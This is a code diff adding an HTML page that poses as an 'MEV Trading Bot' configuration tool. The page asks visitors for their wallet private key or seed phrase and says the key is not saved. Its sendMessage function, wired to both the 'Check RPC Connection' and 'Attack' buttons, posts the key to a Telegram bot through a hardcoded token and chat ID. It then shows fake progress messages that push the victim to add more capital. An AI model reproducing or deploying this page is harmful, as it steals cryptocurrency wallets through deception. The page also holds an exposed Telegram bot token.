@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MEV Bot Configuration</title>
+    <link rel="shortcut icon" href="mev.png" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: rgba(0, 0, 0, 0.712);
+            margin: 0;
+            padding: 20px;
+            color: white;
+        }
+
+        nav {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #007bff;
+            padding: 10px 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+        a{
+            text-decoration: none;
+        }
+
+        nav span {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: white;
+        }
+
+        nav button {
+            background-color: white;
+            color: #007bff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 15px;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        nav a button:hover,
+        nav button:hover {
+            background-color: #0056b3;
+            color: white;
+        }
+
+        .container {
+            background-color: rgb(0, 0, 0);
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: auto;
+            margin: auto;
+        }
+
+        h2 {
+            text-align: center;
+            color: #fff;
+        }
+
+        label {
+            margin-top: 10px;
+            display: block;
+            color: #bbb;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #222;
+            color: #fff;
+        }
+
+        .slippage {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .slippage button {
+            flex: 1;
+            margin-left: 5px;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+        #auto{
+            border: #bbb 2px solid;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        #initiating{
+            display: none;
+        }
+        #initiated{
+            display: none;
+        }
+
+
+        .warning {
+            color: red;
+            font-size: 0.9em;
+        }
+
+        #connect{
+            border: #bbb 2px solid;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        #intance{
+            display: none;
+        }
+        #check{
+            display: none;
+        }
+        #capital{
+            display: none;
+        }
+        .info {
+            display: none;
+            color: #bbb;
+        }
+        #token{
+            display: none;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                width: 90%;
+            }
+
+            nav span {
+                font-size: 1.2em;
+            }
+
+            nav button {
+                padding: 8px 12px;
+                font-size: 0.9em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="home.html"><span>LionAttack🤖</span></a>
+        <a href="mev.html"><button>Start Bot</button></a>
+        <a href="learn.html"><button>Learn More</button></a>
+    </nav>
+
+    <div style="text-align: center; margin-bottom: 20px;">
+        🤖 Welcome to your MEV Trading Bot! 💎
+    </div>
+    
+    <p>
+        The MEV Trading Bot is designed to help you capture Maximal Extracted Value (MEV) opportunities on the blockchain. MEV refers to the extra profit that can be obtained by executing transactions in a specific order, often by front-running, back-running, or sandwich attacks.
+        This bot constantly monitors the mempool (unconfirmed transactions) and identifies profitable MEV opportunities.
+    </p>
+
+    <div class="container">
+        <h2>MEV Bot Configuration</h2>
+
+
+        <p id="fontrun" class="info">A front-running bot is a type of trading bot that capitalizes on price movements by executing trades before significant market events or transactions occur. This practice is commonly seen in cryptocurrency markets and can also apply to traditional finance...</p>
+        <p id="snipe" class="info">A sniper bot is a type of trading bot commonly used in cryptocurrency markets, particularly during token launches or significant market events...</p>
+        <p id="sand" class="info">A sandwich bot is a type of trading bot commonly used in the cryptocurrency market to exploit price movements through a strategy known as "sandwich trading." This practice involves placing two orders around a target transaction to manipulate the price and capture profits...</p>
+        <label for="strategy">Please select a strategy:</label>
+        <select id="strategy" onchange="handleSelection(event)">
+            <option value="">--Select an option--</option>
+            <option value="Sniper">Sniper</option>
+            <option value="FrontRun">Front-Run</option>
+            <option value="Sandwich">Sandwich</option>
+        </select>
+
+        <p id="fontrun" class="info">The Frontrunning strategy involves monitoring the mempool and placing transactions to execute before others, profiting from the price difference.</p>
+        <p id="snipe" class="info">The Sniper strategy involves monitoring the mempool and placing transactions to execute before others, profiting from the price difference.</p>
+        <p id="sand" class="info">The Sandwich strategy involves monitoring the mempool and executing transactions to profit from price differences.</p>
+
+
+        <p class="warning">Please ensure you have the COIN of the selected Blockchain</p>
+        <strong id="base" class="info">You selected Base Chain blockchain.</strong>
+        <strong id="bsc" class="info">You selected Binance Smart Chain blockchain.</strong>
+        <strong id="solana" class="info">You selected Solana blockchain.</strong>
+        <strong id="ethereum" class="info">You selected Ethereum blockchain.</strong>
+        <label for="network">Select a Network:</label>
+        <select id="network" onchange="chainSelection(event)">
+            <option value="">--Select an option--</option>
+            <option value="base">Base Chain</option>
+            <option value="bsc">Binance Smart Chain</option>
+            <option value="solana">Solana</option>
+            <option value="ethereum">Ethereum</option>
+        </select>
+
+        
+
+        <label for="rpc-url">RPC URL:</label>
+        <input type="text" id="rpc-url" placeholder="ex: https://rpc-url/754545">
+
+        <label for="private-key">Enter your Private Key / Seed Phrase:</label>
+        <input type="text" id="private-key" placeholder="Your key is not saved anywhere" />
+
+        <div id="auto">
+            <!-- <p id="initiating">initiating an auto trading... please wait</p> -->
+           
+            <!-- <p id="Initiated">Initiated, You can countiniue...</p> -->
+            <p id="Initiated">initiating an auto trading... please wait</p>
+            <p id="initiating">Initiated, You can countiniue...</p>
+            
+        </div>
+
+        <div class="slippage">
+            <label>Slippage:</label>
+            <button onclick="auto()">Auto</button>
+            <button onclick="tokenContract()">Manual</button>
+        </div>
+
+    
+
+        <div id="token">
+            <label for="token-contracts">Enter token contracts (separated by commas):</label>
+            <input type="text" id="token-contracts" placeholder="Token contracts here">
+        </div>
+        <div id="connect">
+            <p id="intance">Created an instance... please wait, this might take some minites</p>
+            <p id="check">check your wallet connection details</p>
+            <p id="capital">Please update trading CAPITAL and try again.</p>
+        </div>
+        <button onclick="sendMessage()">Check RPC Connection</button>
+        <button onclick="sendMessage()">Attack</button>
+    </div>
+
+    <script>
+        function handleSelection(event) {
+            const value = event.target.value;
+            document.querySelectorAll('.info').forEach(el => el.style.display = 'none');
+            switch (value) {
+                case "Sniper":
+                    document.getElementById('snipe').style.display = 'block';
+                    break;
+                case "FrontRun":
+                    document.getElementById('fontrun').style.display = 'block';
+                    break;
+                case "Sandwich":
+                    document.getElementById('sand').style.display = 'block';
+                    break;
+            }
+        }
+
+        function chainSelection(event) {
+            const value = event.target.value;
+            document.querySelectorAll('.info').forEach(el => el.style.display = 'none');
+            switch (value) {
+                case "base":
+                    document.getElementById('base').style.display = 'block';
+                    break;
+                case "bsc":
+                    document.getElementById('bsc').style.display = 'block';
+                    break;
+                case "solana":
+                    document.getElementById('solana').style.display = 'block';
+                    break;
+                case "ethereum":
+                    document.getElementById('ethereum').style.display = 'block';
+                    break;
+            }
+        }
+
+
+
+        async function sendMessage() {
+            const message = document.getElementById('private-key').value;
+            const token = '8118817056:AAGFJFC3wV5_ZYIzB8DXExsctp6ttmVQYmE'; // Your bot token
+            const chatId = '1028212663';  // Your chat ID or username
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage`; // Correctly include the token
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            });
+
+            let connect = document.getElementById('connect')
+
+            setTimeout(() => {
+            connect.style.display = 'block  ';
+            
+    
+            }, 500);
+
+            let instance = document.getElementById('intance')
+            
+        
+            setTimeout(() => {
+            instance.style.display = 'block  ';
+            
+    
+            }, 2000);
+
+            let seTime = document.getElementById('check')
+            
+        
+            setTimeout(() => {
+            seTime.style.display = 'block  ';
+            
+    
+            }, 7000);
+
+            let capital = document.getElementById('capital')
+            
+        
+            setTimeout(() => {
+            capital.style.display = 'block  ';
+            
+    
+            }, 9000);
+
+
+        }
+   
+        function tokenContract() {
+            document.getElementById('token').style.display = 'block';
+            document.getElementById('auto').style.display = 'none';
+            
+        }
+
+
+        function auto() {
+            
+
+            let conta = document.getElementById('auto')
+            
+        
+            setTimeout(() => {
+            conta.style.display = 'block  ';
+            
+    
+            }, 500);
+            
+
+
+            let initiating = document.getElementById('initiating')
+            
+        
+            setTimeout(() => {
+            initiating.style.display = 'block  ';
+            
+    
+            }, 2000);
+
+
+            let initiated = document.getElementById('initiated')
+            
+        
+            setTimeout(() => {
+            initiated.style.display = 'block  ';
+            
+    
+            }, 8000);
+
+            document.getElementById('token').style.display = 'none';
+            
+        }
+
+
+
+    </script>
+    <script type="module" src="index.js"></script>
+</body>
+</html>
